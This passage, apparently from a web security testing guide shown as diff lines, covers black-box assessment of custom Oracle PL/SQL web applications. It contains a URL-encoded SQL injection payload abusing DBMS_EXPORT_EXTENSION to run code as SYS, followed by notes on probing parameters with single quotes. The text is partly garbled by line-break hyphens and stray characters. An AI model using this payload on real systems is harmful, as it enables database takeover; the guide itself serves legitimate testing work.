@@ -1,0 +1,30 @@
+XPORT_EXTENSION (see http:/secunia.
+com/advisories/ 19860)
+http:/www.example.com/pls/dad/orasso.home?);
+execute%20immediate%20:1;--=DECLARE%20BUF%20
+VARCHAR2(2000);%20BEGIN%20
+BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_IN-
+DEX_TABLES
+(INDEX_NAME*INDEX_SCHEMA‘DBMS_OUTPUT.PUT_
+LINE(:p 1);
+EXECUTE%20IMMEDIATE%20"CREATE%200R%20RE-
+PLACE%20
+PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.
+OWA_UTIL";
+END;--/SYS/1;/VER;0);END;
+Assessing Custom PL/SQL Web Applications
+During black box security assessments, the code of the custom
+PL/SQL application is not available, but it still needs to be as-
+sessed for security vulnerabilities.
+Testing for SQL Injection
+Each input parameter should be tested for SQL injection flaws.
+These are easy to find and confirm. Finding them is as easy as
+embedding a single quote into the parameter and checking for er-
+ror responses (which include 404 Not Found errors). Confirming
+the presence of SQL injection can be performed using the concat-
+enation operator.
+For example, assume there is a bookstore PL/SQL web application
+that allows users to search for books by a given author:
+http:/www.example.com/pls/bookstore/books.search?au-
+thor=DICKENS
+If this request returns book
